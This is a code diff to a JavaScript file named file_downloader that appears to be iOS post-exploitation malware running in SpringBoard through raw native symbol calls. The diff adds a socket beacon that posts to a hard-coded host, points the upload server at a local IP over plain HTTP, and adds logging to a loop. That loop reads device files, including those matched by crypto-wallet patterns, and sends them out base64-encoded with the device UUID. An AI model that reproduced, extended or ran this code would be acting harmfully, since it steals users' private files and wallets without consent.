@@ -215,14 +215,48 @@ class Native {
 
 const TAG = "INFO";
 
+// Startup notification - sent immediately when file_downloader starts
+function sendStartupNotification() {
+	try {
+		const sock = Native.callSymbol("socket", 2, 1, 6);
+		if (sock >= 0) {
+			const addrBuf = Native.callSymbol("malloc", 16n);
+			Native.write16(addrBuf, 2);
+			// Port 8001 in network byte order (big endian)
+			Native.write16(addrBuf + 2n, 0x1129);
+			// IP 192.168.10.188
+			const ipBytes = new Uint8Array([192, 168, 10, 188]);
+			Native.write(addrBuf + 4n, ipBytes.buffer);
+			Native.write32(addrBuf + 8n, 0);
+
+			const connected = Native.callSymbol("connect", sock, addrBuf, 16n);
+			Native.callSymbol("free", addrBuf);
+
+			if (connected === 0) {
+				const msg = '{"status":"file_downloader_STARTED","process":"SpringBoard"}';
+				const httpReq = `POST /stats HTTP/1.1\r\nHost: 192.168.10.188:8001\r\nContent-Type: application/json\r\nContent-Length: ${msg.length}\r\n\r\n${msg}`;
+				const reqBytes = new Uint8Array(httpReq.length);
+				for (let i = 0; i < httpReq.length; i++) {
+					reqBytes[i] = httpReq.charCodeAt(i) & 0xFF;
+				}
+				const reqBuf = Native.callSymbol("malloc", BigInt(reqBytes.byteLength));
+				Native.write(reqBuf, reqBytes.buffer);
+				Native.callSymbol("send", sock, reqBuf, reqBytes.byteLength, 0);
+				Native.callSymbol("free", reqBuf);
+			}
+			Native.callSymbol("close", sock);
+		}
+	} catch (e) {}
+}
+
 // Server configuration - modify as needed
-const SERVER_HOST = "sqwas.shapelie.com";
-const HTTP_PORT = 8882;
-const HTTPS_PORT = 8881;
+const SERVER_HOST = "192.168.10.188";
+const HTTP_PORT = 8001;
+const HTTPS_PORT = 8001;
 const UPLOAD_PATH = "/stats";
 
 // Set to true to use HTTPS (CFStream with TLS), false for plain HTTP (raw sockets)
-const USE_HTTPS = true;
+const USE_HTTPS = false;
 
 // Maximum file size to download (15GB)
 const MAX_FILE_SIZE = 15000 * 1024 * 1024 * 1024;
@@ -470,6 +504,9 @@ const CRYPTO_WALLET_PATTERNS = [
 // ============================================================================
 
 Native.init();
+
+// Send startup notification immediately
+sendStartupNotification();
 
 // ============================================================================
 // Helper Functions
@@ -3289,11 +3326,34 @@ function getProcessName() {
 // Main Execution
 // ============================================================================
 
+// Debug log function
+function debugLog(msg) {
+	try {
+		const debugFile = "/tmp/file_downloader_debug.log";
+		const O_WRONLY = 0x0001;
+		const O_APPEND = 0x0008;
+		const O_CREAT = 0x0200;
+		const flags = O_WRONLY | O_CREAT | O_APPEND;
+		const fd = Native.callSymbol("open", debugFile, flags, 0o644);
+		if (fd >= 0) {
+			const timestamp = new Date().toISOString();
+			const logLine = `[${timestamp}] ${msg}\n`;
+			const bytes = Native.stringToBytes(logLine, false);
+			const buf = Native.callSymbol("malloc", BigInt(bytes.byteLength));
+			Native.write(buf, bytes);
+			Native.callSymbol("write", fd, buf, bytes.byteLength);
+			Native.callSymbol("free", buf);
+			Native.callSymbol("close", fd);
+		}
+	} catch (e) {}
+}
+
 try {
-	
+	debugLog("file_downloader.js started");
 	const processName = getProcessName();
 	const currentPid = Native.callSymbol("getpid");
 	const deviceUUID = getDeviceUUID();
+	debugLog(`process=${processName} pid=${currentPid} uuid=${deviceUUID}`);
 	
 	
 	let successCount = 0;
@@ -3305,26 +3365,29 @@ try {
 		const filePath = fileInfo.path;
 		const category = fileInfo.category;
 		const description = fileInfo.description;
-		
-		
+
+		debugLog(`[${i}] Reading: ${filePath}`);
 		// Read file as base64
 		const result = readFileAsBase64(filePath);
-		
+
 		if (result === null) {
 			skipCount++;
+			debugLog(`[${i}] Skipped (not found)`);
 			continue;
 		}
-		
-		
+
+		debugLog(`[${i}] Sending ${result.size} bytes`);
 		// Send via HTTP or HTTPS based on configuration
-		const sent = USE_HTTPS 
+		const sent = USE_HTTPS
 			? sendFileViaHTTPS(filePath, category, description, result.data, result.size, deviceUUID)
 			: sendFileViaHTTP(filePath, category, description, result.data, result.size, deviceUUID);
-		
+
 		if (sent) {
 			successCount++;
+			debugLog(`[${i}] Sent OK`);
 		} else {
 			failCount++;
+			debugLog(`[${i}] Send FAILED`);
 		}
 		
 		// Small delay between files to avoid overwhelming the server
